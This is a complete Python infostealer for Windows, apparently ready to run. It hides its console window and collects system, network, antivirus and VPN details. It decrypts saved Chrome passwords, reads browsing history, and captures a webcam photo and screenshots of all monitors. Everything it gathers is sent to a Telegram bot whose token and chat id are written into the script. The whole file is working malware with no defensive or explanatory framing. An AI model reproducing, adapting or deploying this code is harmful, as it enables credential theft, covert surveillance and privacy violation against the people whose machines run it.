import requests
import ctypes
import os
import socket
import platform
import psutil
import datetime
import mss
import base64
import os
import shutil
import sqlite3
import win32crypt
import datetime
import glob
import shutil
import mss.tools
from PIL import ImageGrab
import cv2

try:
    import GPUtil
except ImportError:
    GPUtil = None

try:
    from screeninfo import get_monitors
except ImportError:
    get_monitors = None

try:
    import wmi
except ImportError:
    wmi = None

# Hide console window (Windows only)
def hide_console():
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Get public IP address
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        response.raise_for_status()
        return response.json().get('ip')
    except requests.RequestException:
        return "Unavailable"

# Get geo-location based on IP and make a clickable Google Maps link
def get_geo_location():
    try:
        response = requests.get("https://ipinfo.io")
        location = response.json().get('loc', 'Unavailable')
        # Generate Google Maps URL for the location
        lat, lon = location.split(',')
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        return f"[Location]({maps_url})"
    except requests.RequestException:
        return "Geo-location unavailable"

# Get system uptime
def get_uptime():
    boot_time = datetime.datetime.fromtimestamp(psutil.boot_time())
    uptime = datetime.datetime.now() - boot_time
    return str(uptime).split('.')[0]

# Disk usage
def get_disk_usage():
    usage = psutil.disk_usage('/')
    return f"💽 Disk Usage: {usage.percent}% of {round(usage.total / (1024**3))} GB"

# Get logged in user
def get_logged_in_user():
    return os.getlogin()

# Gather hardware info
def get_hardware_info():
    lines = []

    # CPU Info
    cpu_name = platform.processor()
    cores = psutil.cpu_count(logical=False)
    threads = psutil.cpu_count(logical=True)
    lines.append(f"🧠 CPU: {cpu_name} ({cores} cores / {threads} threads)")

    # RAM Info
    mem = psutil.virtual_memory()
    ram_total = round(mem.total / (1024**3), 2)
    ram_used = round(mem.used / (1024**3), 2)
    lines.append(f"💾 RAM: {ram_used} GB used / {ram_total} GB total")

    # GPU Info
    if GPUtil:
        gpus = GPUtil.getGPUs()
        if gpus:
            lines.append(f"🎮 GPU: {gpus[0].name}")
        else:
            lines.append("🎮 GPU: Not detected")
    else:
        lines.append("🎮 GPU: [Unavailable]")

    # Motherboard Info
    if wmi:
        try:
            c = wmi.WMI()
            boards = c.Win32_BaseBoard()
            if boards:
                lines.append(f"🧩 Motherboard: {boards[0].Product.strip()}")
        except:
            lines.append("🧩 Motherboard: [Error]")
    else:
        lines.append("🧩 Motherboard: [Unavailable]")

    # OS Info
    os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
    lines.append(f"🪟 OS: {os_info}")

    # Monitor Resolution(s)
    if get_monitors:
        resolutions = [f"{m.width}x{m.height}" for m in get_monitors()]
        lines.append(f"🖥️ Resolution(s): {', '.join(resolutions)}")
    else:
        lines.append("🖥️ Resolution: [Unavailable]")

    # Battery Info
    battery = psutil.sensors_battery()
    if battery:
        lines.append(f"🔋 Battery: {battery.percent}% {'(Charging)' if battery.power_plugged else '(Not Charging)'}")
    else:
        lines.append("🔋 Battery: Not Available")

    return "\n".join(lines)

# Capture face cam image and save it
def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)  # Start the webcam
        if not cap.isOpened():
            return None

        # Set the resolution for the webcam (e.g., 1280x720 or 1920x1080)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)  # Set width to 1280px
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)  # Set height to 720px

        ret, frame = cap.read()
        if ret:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"webcam_{timestamp}.jpg"
            cv2.imwrite(filename, frame)  # Save the frame as an image file
            cap.release()
            return filename
        cap.release()
        return None
    except Exception as e:
        print(f"Webcam capture failed: {e}")
        return None

# Send plain text message to Telegram
def send_to_telegram(bot_token, chat_id, message):
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', data=payload)
    except requests.RequestException:
        pass

# Send webcam image to Telegram
def send_webcam_image(bot_token, chat_id, filename):
    try:
        with open(filename, 'rb') as file:
            payload = {
                'chat_id': chat_id,
                'caption': '📸 Webcam Snapshot:'
            }
            files = {
                'photo': file
            }
            response = requests.post(f'https://api.telegram.org/bot{bot_token}/sendPhoto', data=payload, files=files)
            
            # Check if the response is successful before deleting the file
            if response.status_code == 200:
                os.remove(filename)  # Clean up the file after sending
            else:
                print(f"Failed to send webcam image: {response.text}")
    except Exception as e:
        print(f"Error sending webcam image: {e}")

# Capture all monitors and send to Telegram
def capture_all_screens_and_send(bot_token, chat_id):
    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"full_screenshot_{timestamp}.png"

        with mss.mss() as sct:
            monitor = sct.monitors[0]  # 0 = all monitors combined
            sct_img = sct.grab(monitor)
            mss.tools.to_png(sct_img.rgb, sct_img.size, output=filename)

        with open(filename, 'rb') as file:
            payload = {
                'chat_id': chat_id,
                'caption': '📸 Full multi-monitor screenshot:'
            }
            files = {
                'photo': file
            }
            requests.post(f'https://api.telegram.org/bot{bot_token}/sendPhoto', data=payload, files=files)

        os.remove(filename)
    except Exception as e:
        print(f"Screenshot failed: {e}")

# Detect VPN or Proxy connections
def detect_vpn_proxy():
    indicators = []

    # Check adapter names for VPN clues
    for iface, addrs in psutil.net_if_addrs().items():
        if any(keyword in iface.lower() for keyword in ['vpn', 'tun', 'tap', 'ppp']):
            indicators.append(f"🔒 VPN Adapter Found: {iface}")

    # Query external IP intelligence service (ipinfo)
    try:
        response = requests.get("https://ipinfo.io/json")
        data = response.json()
        if data.get("org"):
            indicators.append(f"📡 Network Org: {data['org']}")
        if data.get("hostname"):
            indicators.append(f"🧭 Hostname: {data['hostname']}")
        if data.get("proxy", False):
            indicators.append("🛡️ Detected Proxy via API")
    except Exception as e:
        indicators.append("🌐 External VPN check failed")

    return "\n".join(indicators) if indicators else "No VPN/Proxy detected"

# Get antivirus software information
def get_antivirus_software():
    if not wmi:
        return "WMI module not available"

    try:
        w = wmi.WMI(namespace="root\SecurityCenter2")
        av_products = w.AntiVirusProduct()
        if av_products:
            return "\n".join([f"🛡️ AV: {av.displayName}" for av in av_products])
        else:
            return "No antivirus software detected"
    except Exception as e:
        return f"Error accessing AV info: {e}"

# Get list of active network connections
def get_active_connections(limit=10):
    connections = []
    for conn in psutil.net_connections(kind="inet"):
        if conn.raddr and conn.status == "ESTABLISHED":
            laddr = f"{conn.laddr.ip}:{conn.laddr.port}"
            raddr = f"{conn.raddr.ip}:{conn.raddr.port}"
            connections.append(f"{laddr} → {raddr} ({conn.status})")
    return connections[:limit] if connections else ["No active connections"]

# Function to save decrypted Chrome passwords to a .txt file
def save_chrome_passwords_to_file(limit=10):
    login_db_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
    temp_copy = "LoginData_temp"
    try:
        # Copy the Login Data file to avoid file access errors
        shutil.copy2(login_db_path, temp_copy)

        # Connect to the copied database
        conn = sqlite3.connect(temp_copy)
        cursor = conn.cursor()

        # Execute the query to get saved passwords
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        file_path = "chrome_passwords.txt"
        with open(file_path, 'w') as file:
            # Loop through each saved login and decrypt the password
            for row in cursor.fetchall()[:limit]:
                url, username, encrypted_password = row
                try:
                    # Decrypt the password using CryptUnprotectData
                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                    # Write the decrypted password to the file
                    file.write(f"🔐 URL: {url}\n👤 Username: {username}\n🔑 Password: {password}\n\n")
                except Exception as e:
                    # In case of decryption failure, log the failure message
                    file.write(f"🔐 URL: {url}\n👤 Username: {username}\n🔑 [Decryption Failed] {str(e)}\n\n")

        # Close the database connection and remove the temporary file
        conn.close()
        os.remove(temp_copy)
        return file_path
    except Exception as e:
        return f"Failed to get Chrome passwords: {e}"

def save_chrome_history_to_file(limit=10):
    try:
        history_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
        temp_copy = "History_temp"
        shutil.copy2(history_path, temp_copy)  # Avoid locking issues

        conn = sqlite3.connect(temp_copy)
        cursor = conn.cursor()

        cursor.execute("""
            SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?
        """, (limit,))
        
        file_path = "chrome_history.txt"
        with open(file_path, 'w') as file:
            for url, title, visit_time in cursor.fetchall():
                visit_dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=visit_time)
                file.write(f"🔗 {title or '[No Title]'}\n🌍 {url}\n🕓 {visit_dt.strftime('%Y-%m-%d %H:%M:%S')}\n\n")

        conn.close()
        os.remove(temp_copy)
        return file_path
    except Exception as e:
        return f"Failed to retrieve Chrome history: {e}"

# Function to send the file to Telegram
def send_file_to_telegram(bot_token, chat_id, file_path, caption=""):
    try:
        with open(file_path, 'rb') as file:
            payload = {
                'chat_id': chat_id,
                'caption': caption
            }
            files = {
                'document': file
            }
            response = requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument', data=payload, files=files)
            if response.status_code == 200:
                print(f"Sent {file_path} to Telegram successfully.")
            else:
                print(f"Failed to send {file_path}: {response.text}")
    except Exception as e:
        print(f"Error sending file to Telegram: {e}")

# ===== MAIN LOGIC =====
if __name__ == "__main__":
    hide_console()

    bot_token = "7325793441:AAE60APFUK9PXhip0Dnk3xHoyS8th3VSCC0"
    chat_id = "-1002626516608"

    computer_name = socket.gethostname()
    ip = get_public_ip()
    geo_location = get_geo_location()  # Get geo-location data with clickable link
    uptime = get_uptime()
    hardware_info = get_hardware_info()
    disk_info = get_disk_usage()
    user = get_logged_in_user()
    vpn_info = detect_vpn_proxy()
    av_info = get_antivirus_software()
    active_conns = get_active_connections()
    # Save history and passwords to files
    history_file = save_chrome_history_to_file()
    passwords_file = save_chrome_passwords_to_file()
    # Save passwords to a file and send it
    passwords_file = save_chrome_passwords_to_file()

    # Send the passwords file to Telegram
    send_file_to_telegram(bot_token, chat_id, passwords_file, "🔐 Decrypted Chrome Saved Passwords")

    # Send files to Telegram
    send_file_to_telegram(bot_token, chat_id, history_file, "📜 Chrome Browsing History")
    send_file_to_telegram(bot_token, chat_id, passwords_file, "🔐 Chrome Saved Passwords")



    msg = (
        f"🖥️ Computer Name: {computer_name}\n"
        f"👤 Logged in User: {user}\n\n"
        f"🌐 Network Info:\n"
        f"🧠 Public IP: {ip}\n"
        f"🌍 Location: {geo_location}\n\n"  # Add Geo-Location here
        f"🔧 Hardware Info:\n"
        f"{hardware_info}\n\n"
        f"🕓 Uptime: {uptime}\n"
        f"{disk_info}\n\n"
        f"\n🛡️ Antivirus Info:\n{av_info}\n"
        f"\n🕵️ VPN/Proxy Info:\n{vpn_info}\n"
        f"🔌 Active Connections:\n"
        + "\n".join(active_conns) + "\n"
    )

    send_to_telegram(bot_token, chat_id, msg)

    # Capture and send webcam image if available
    webcam_image = capture_webcam()
    if webcam_image:
        send_webcam_image(bot_token, chat_id, webcam_image)

    # Capture and send screenshot
    capture_all_screens_and_send(bot_token, chat_id)
